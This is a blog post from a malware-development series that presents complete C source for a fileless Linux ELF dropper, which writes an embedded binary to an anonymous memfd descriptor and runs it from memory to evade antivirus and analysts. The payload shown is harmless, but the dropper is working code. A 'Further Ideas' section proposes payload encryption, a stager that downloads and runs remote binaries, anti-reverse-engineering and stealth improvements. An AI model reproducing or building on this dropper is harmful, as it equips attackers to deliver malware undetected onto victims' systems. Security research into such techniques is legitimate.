---
layout: post
category: Malware
tags: [hacking, programming, malwaredev]
---

# Introduction

A dropper is a program that is used to execute malicious code on a
computer. It is a kind of installer, that hides the malware from the
antivirus system, and the analyst.

In a [previous blog post]({% post_url 2023-02-02-a-dropper-in-golang
%}), i described a dropper that I designed in Golang. It had (at
least) two drawbacks:

- The malware that is delivered needs to be in the form of position independent
  code, with all data inlined, so-called shellcode. While this works
  for a proof of concept, it cannot be used to drop ELF files. Thus,
  the malicious code, such as a stealer or remote access trojan needs
  to be converted to shellcode before it can be dropped with the
  previous dropper. That is cumbersome, especially for large programs.
- The malicious code in the previous dropper was file-backed. In
  contrast, a fileless dropper executes the payload in memory only and
  thus is harder to detect.

This blog post takes care of both these drawbacks by describing a fileless ELF dropper.
As the terminology in this area is not standardized, we could also call it a userspace
exec implementation in memory.

# The Payload
First of all we need a payload that we can drop.
While a real payload of a dropper has some malicious purpose such as
stealing credentials, as we are concentrating on the dropper we will
use a small harmless payload.

{% highlight C %}
// compile with gcc payload.c -o payload
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char buffer[1024];
    ssize_t len = readlink("/proc/self/exe", buffer, sizeof(buffer) - 1);

    if (len != -1) {
        buffer[len] = '\0';
        printf("My executable's file path is: %s\n", buffer);
    } else {
        perror("Error reading executable path");
    }
    return 0;
}
{% endhighlight %}

This payload returns the executable's own file. While
it may be possible to write this as shellcode in assembly, it
is clear that larger programs become more cumbersome. That is the
motivation for dropping ELF files directly.

```
$ gcc -o payload payload.c 
$ ./payload 
My executable's file path is: /home/user/<redacted>/payload
```

We can get the content of the payload binary as a static C array
using `xxd` as follows.

```
$ xxd -i payload
unsigned char payload[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
  ....
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
unsigned int payload_len = 23592;
```

# The Dropper
Now, on to designing the dropper.
The idea is to create an anonymous file descriptor using
`memfd_create()`. We write the ELF binary to this file
descriptor. Consequently the ELF is not backed by memory, but resides
only in RAM.
The binary is then available in `procfs` at `/proc/self/fd/%i`, where
`%i` is the return value of `memfd_create()`.
Consequently, we can execute it using `execl()`.

And that is basically everything there is to it.

{% highlight C %}
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>


unsigned char payload[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
  ....
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
unsigned int payload_len = 23592;

int main() {
    // Create an anonymous file descriptor
    int memfd = memfd_create("", MFD_CLOEXEC);
    if (memfd == -1) {
        perror("memfd_create");
        exit(EXIT_FAILURE);
    }

    // Write the payload to the memfd file descriptor
    write(memfd, payload, payload_len);

    // Create the string describing the file descriptor
    char * p;
    asprintf(&p, "/proc/self/fd/%i", memfd);

    // Execute the ELF binary at the anonymous file descriptor
    if (execl(p, NULL) == -1) {
        perror("execl");
        exit(EXIT_FAILURE);
    }

    // This code will not be reached if fexecve is successful
    exit(EXIT_SUCCESS);
}
{% endhighlight %}

Running the code looks as follows.

```
$ gcc -o dropper dropper.c 
$ ./dropper 
My executable's file path is: /memfd: (deleted)
```

# Further Ideas
As the code shown covers only the dropping, i will add some points
that should be included to make the code more production-ready.

- *Obfuscation:* In the version shown above, the ELF file sits naked in
  the binary file of the dropper as a static array. This can be improved by using
  obfuscation based on base64 encoding or an encryption algorithm such
  as AES or RC4. Then, the ELF file is included in the dropper in
  obfuscated form, and before writing it to the anonymous file handle,
  it is deobfuscated.
- *Download ELF:* Another idea is to not have the ELF file in the
  binary at all, but use a stager instead. The stager connects to a
  remote server, receives the (obfuscated) binary, and executes
  it. This way, the binary is not included in the original dropper.
- *Anti-RE:* Currently, the code is easy to analyze using a
  debugger. Some anti-reverse engineering tricks could be added to spice
  things up.
- *Stealthiness:* The shown trick is nearly only used by malware, and
  thus antivirus software will probably flag it. I am not yet sure how
  to improve that.

# Epilogue
With great power comes great responsibility.
Do not use this for malicious purposes and don't be a jerk.

# Some References
- https://grugq.github.io/docs/ul_exec.txt
- https://stackoverflow.com/questions/63208333/using-memfd-create-and-fexecve-to-run-elf-from-memory
- https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
- https://0x00sec.org/t/super-stealthy-droppers/3715
- https://www.guitmz.com/running-elf-from-memory/
